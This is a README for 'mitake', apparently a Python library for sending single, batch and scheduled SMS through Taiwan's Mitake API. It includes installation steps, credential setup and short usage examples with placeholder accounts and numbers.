# 📱 mitake - Effortlessly Send SMS via API

## 🚀 Download & Install

[![Download mitake](https://img.shields.io/badge/Download-mitake-blue)](https://github.com/sawbaf/mitake/releases)

To get started, visit the Releases page to download the latest version of the `mitake` library.

[Visit the Releases page to download](https://github.com/sawbaf/mitake/releases)

## 📦 What is mitake?

`mitake` is a Python library that helps you send SMS messages using the 三竹簡訊 (Mitake) API in Taiwan. This library makes it easy to communicate with your audience through text messages.

## 🌟 Features

- **UTF-8 Encoding**: Supports Chinese messages without any issues.
- **Single and Batch Sending**: Send one message or many at once.
- **Scheduled Sending**: Set a time to send messages later.
- **Status Inquiry**: Check the status of sent messages and account balance.
- **Error Handling**: Handles errors smoothly.
- **User-Friendly**: Simple API design makes it easy to use.

## 🛠️ System Requirements

- Python 3.6 or higher
- An active 三竹簡訊 account

## 🚀 Getting Started

### 1. Install mitake

Open your terminal or command prompt and run the following command:

```bash
pip install mitake
```

### 2. Basic Setup

You need to initialize the `MitakeClient`. You can do this in two ways:

#### Method 1: Direct Credentials

Replace `your_username` and `your_password` with your actual 三竹簡訊 account information.

```python
from mitake import MitakeClient

client = MitakeClient(username="your_username", password="your_password")
```

#### Method 2: Environment Variables

Set your username and password as environment variables. 

- **Linux/macOS**:
  ```bash
  export MITAKE_USERNAME="your_username"
  export MITAKE_PASSWORD="your_password"
  ```

- **Windows**:
  ```cmd
  set MITAKE_USERNAME=your_username
  set MITAKE_PASSWORD=your_password
  ```

Then, initialize without passing the username and password directly:

```python
from mitake import MitakeClient

client = MitakeClient()
```

### 3. Send a Single SMS

To send a single SMS, use the `send_sms` method. Here’s how to do it:

```python
result = client.send_sms(
    to="0912345678",  # Replace with a Taiwanese mobile number
    message="你好，我是小海！這是測試訊息 🎉"
)
print(result)
```

### 4. Send Batch SMS

You can send multiple messages at once. Here’s an example:

```python
messages = [
    {"to": "0912345678", "message": "嗨！這是第一則訊息"},
    {"to": "0987654321", "message": "嗨！這是第二則訊息", "message_id": "custom_id_1"},
    {
        "to": "0966666666",
        "message": "這是完整參數的訊息",
        "message_id": "full_example",
        "send_time": "20241231235900",  # YYYYMMDDHHMMSS 格式
        "dest_name": "Custom Name"
    },
]

result = client.send_batch_sms(messages)
print(result)
```

### 5. Check SMS Status

To check the status of your message or your account balance, use the appropriate methods provided by the library.

```python
status = client.check_status()
print(status)

balance = client.check_balance()
print(balance)
```

## 💡 Additional Tips

- Always handle errors gracefully. Review the library documentation for more ways to manage exceptions.
- Ensure that the phone numbers you use are formatted correctly.

## 📝 Resources

For further information, please visit the [Documentation](https://github.com/sawbaf/mitake/wiki) or check the [GitHub issues page](https://github.com/sawbaf/mitake/issues) for common questions and answers.

## 📥 Download the Latest Version

For the latest updates, always check the Releases page. Click the link below to download:

[![Download mitake](https://img.shields.io/badge/Download-mitake-blue)](https://github.com/sawbaf/mitake/releases) 

That’s it! You are ready to use the `mitake` library for sending SMS messages easily.